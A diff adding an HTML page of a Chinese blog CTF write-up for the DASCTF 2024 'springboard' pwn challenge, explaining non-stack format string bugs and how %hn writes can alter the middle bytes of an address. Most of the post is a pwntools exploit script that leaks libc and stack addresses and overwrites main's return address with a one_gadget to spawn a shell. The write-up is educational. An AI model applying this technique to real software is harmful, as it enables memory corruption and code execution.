@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>非栈上格式化字符串，并如何利用%n修改地址的中间值 | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">非栈上格式化字符串，并如何利用%n修改地址的中间值</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">七月 22, 2024&nbsp;&nbsp;12:44:06</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/ctf/">ctf</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>题目来源：DASCTF 2024暑期挑战赛springboard</p>
+<h1 id="非栈上的格式化字符串"><a href="#非栈上的格式化字符串" class="headerlink" title="非栈上的格式化字符串"></a>非栈上的格式化字符串</h1><p>从标准输入读入到bss段，再从bss段读出</p>
+<p><img src="/../image/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E5%B9%B6%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8-n%E4%BF%AE%E6%94%B9%E5%9C%B0%E5%9D%80%E7%9A%84%E4%B8%AD%E9%97%B4%E5%80%BC/1.png" alt="1"></p>
+<p>bss段不在栈上，因此非栈上的格式化字符串不用计算栈上输入造成偏移，也不需要考虑栈地址对齐</p>
+<p>而%s和%n等却依然可以直接打印和修改栈上的值，参数位数和在栈上一样，不过不用加上自己输入的字节数</p>
+<h1 id="n修改地址中间"><a href="#n修改地址中间" class="headerlink" title="%n修改地址中间"></a>%n修改地址中间</h1><p>%n可修改4字节类似的hn和hhn是修改2字节和1字节，但是修改字节只能修改地址末端</p>
+<p>而地址在内存中是连续分布的，因此若只想修改倒数第三四位，则给指向改地址指针的地址加上一字节即可，这样新的指针值向的地址最后两位就是原先地址的倒数三四位，新地址前两位就是原先地址的上一组数据</p>
+<p>注意：一字节能存两个十六进制位</p>
+<p>原先指针 0x7ffd5fa7a138 指向0x7aa9c8e20494</p>
+<p><img src="/../image/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E5%B9%B6%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8-n%E4%BF%AE%E6%94%B9%E5%9C%B0%E5%9D%80%E7%9A%84%E4%B8%AD%E9%97%B4%E5%80%BC/2.png" alt="2"></p>
+<p>修改后：原先指针加上两字节变为0x7ffd5fa7a13a 指向的地址右移了四位</p>
+<p><img src="/../image/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E5%B9%B6%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8-n%E4%BF%AE%E6%94%B9%E5%9C%B0%E5%9D%80%E7%9A%84%E4%B8%AD%E9%97%B4%E5%80%BC/3.png" alt="3"></p>
+<p>此时对新指针进行%n操作即可直接修改0x7aa9c8e20494中间的值</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>五次payload</p>
+<p>第一次，泄露栈地址和libc</p>
+<p>第二次，修改栈地址指向main返回地址</p>
+<p>第三次，修改main返回地址值的后四位</p>
+<p>第四次，修改栈地址指向main返回地址中间</p>
+<p>第五次，修改栈main返回地址中间两位</p>
+<p>五次之后，main返回到onegadget获得shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc6-i386_2.27-3ubuntu1_amd64.so&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%9$p%11$p&#x27;</span></span><br><span class="line"><span class="comment">#payload=payload.ljust(16,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment">#payload+=p64(got)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Please enter a keyword\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">addr=r.recv(<span class="number">14</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(addr,<span class="number">16</span>)</span><br><span class="line">addr2=r.recv(<span class="number">14</span>)</span><br><span class="line">addr2=addr2[-<span class="number">4</span>:]</span><br><span class="line">addr2=<span class="built_in">int</span>(addr2,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># print(hex(addr2))</span></span><br><span class="line"><span class="comment"># print(&#x27;=========&#x27;)</span></span><br><span class="line">offset1=addr-got-<span class="number">240</span></span><br><span class="line"><span class="comment"># print(hex(addr))</span></span><br><span class="line">system_addr = offset1 + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = offset1 + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">exe=offset1+<span class="number">0xf1247</span></span><br><span class="line"><span class="comment"># print(hex(exe))</span></span><br><span class="line"><span class="comment"># print(hex(system_addr))</span></span><br><span class="line"><span class="comment"># print(hex(binsh_addr))</span></span><br><span class="line"><span class="comment"># print (&#x27;========&#x27;)</span></span><br><span class="line"><span class="comment">#r.recvuntil(&#x27;Please enter a keyword\n&#x27;)</span></span><br><span class="line"><span class="comment">#payload=&#x27;%11$p&#x27;</span></span><br><span class="line"><span class="comment">#r.sendline(payload)#2</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base==&gt;<span class="subst">&#123;<span class="built_in">hex</span>(offset1)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset=addr2-<span class="number">0xE0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(offset))</span></span><br><span class="line"><span class="comment"># print(&#x27;=========&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Please enter a keyword\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(offset).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">r.sendline(payload)<span class="comment">#2</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Please enter a keyword\n&#x27;</span>)</span><br><span class="line">exe=<span class="built_in">hex</span>(exe)</span><br><span class="line">log.success(<span class="string">f&quot;one_gadget==&gt;<span class="subst">&#123;(exe)&#125;</span>&quot;</span>)</span><br><span class="line">addr3=exe[-<span class="number">4</span>:]</span><br><span class="line">addr4=exe[-<span class="number">6</span>:]</span><br><span class="line">addr4=addr4[:<span class="number">2</span>]</span><br><span class="line">addr4=<span class="built_in">int</span>(addr4,<span class="number">16</span>)</span><br><span class="line">addr3=<span class="built_in">int</span>(addr3,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># print(hex(addr3))</span></span><br><span class="line"><span class="comment"># print(hex(addr4))</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(addr3).encode()+<span class="string">b&#x27;c%37$hn&#x27;</span></span><br><span class="line">r.sendline(payload)<span class="comment">#3</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Please enter a keyword\n&#x27;</span>)</span><br><span class="line">payload=payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(offset+<span class="number">2</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)<span class="comment">#4</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Please enter a keyword\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(addr4).encode()+<span class="string">b&#x27;c%37$hhn&#x27;</span></span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">r.sendline(payload)<span class="comment">#5</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"># 格式化字符串</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/07/20/24%E9%9B%86%E8%AE%ADweek2/">24集训week2</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
